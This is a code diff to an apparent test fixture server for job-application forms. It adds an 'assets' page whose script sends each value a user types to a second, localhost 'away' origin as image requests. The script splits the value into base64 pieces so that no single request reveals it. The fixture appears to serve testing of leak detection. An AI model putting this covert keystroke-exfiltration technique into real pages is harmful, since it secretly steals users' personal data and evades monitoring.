@@ -31,6 +31,8 @@ import { createServer, type IncomingMessage, type Server } from "node:http";
  *   echo          the same help text above the form; the submit posts and swaps the form for "Saved."
  *   posting-next  email and full name shown, phone and location in a hidden step; its "Next" is a
  *                 native submit button: clicking it posts the first step (and redirects to /thanks)
+ *   assets        name, email and location; loads a logo from localhost, and on input asks localhost
+ *                 for images whose paths carry pieces of what was typed (base64 pieces, the first word)
  */
 
 export interface WebSubmission {
@@ -226,6 +228,24 @@ ${text("Email address", "email", { type: "email" })}${text("Full name", "full_na
 <p><button>Next</button></p></form>`;
 }
 
+function assetsBody(away: string): string {
+	return `<h1>Robotics Engineer at Acme Robotics</h1><img src="${away}/web/assets/logo.png" alt="">
+<form id="apply" method="post" action="/web/assets/apply">
+${text("Full name", "full_name", { required: true })}${text("Email address", "email", { type: "email" })}${text("Where are you based?", "location")}
+<p><button type="submit">Submit application</button></p></form>`;
+}
+
+/** Each typed value leaves in pieces no single one of which is the value: only by path. */
+const ASSETS = `const at = (path) => { new Image().src = window.AWAY_ORIGIN + '/web/assets/' + path + '.png'; };
+const b64 = (t) => btoa(t).replace(/=+$/, '');
+for (const el of document.querySelectorAll('input')) el.addEventListener('input', () => {
+	const v = el.value;
+	at(b64(v.slice(0, 8)));
+	at(b64(v.slice(8)));
+	at(encodeURIComponent(v.split(/[ ,@]/)[0]));
+	at('logo');
+});`;
+
 /** Posts every box as "label or nearby text = value", as the page shows it. */
 const NAMELESS = `const form = document.getElementById('apply');
 form.addEventListener('submit', async (e) => {
@@ -309,6 +329,8 @@ function formPage(
 			return page(echoBody(), ECHO);
 		case "posting-next":
 			return page(postingNextBody());
+		case "assets":
+			return page(assetsBody(awayOrigin), ASSETS, awayOrigin);
 		default:
 			return null;
 	}
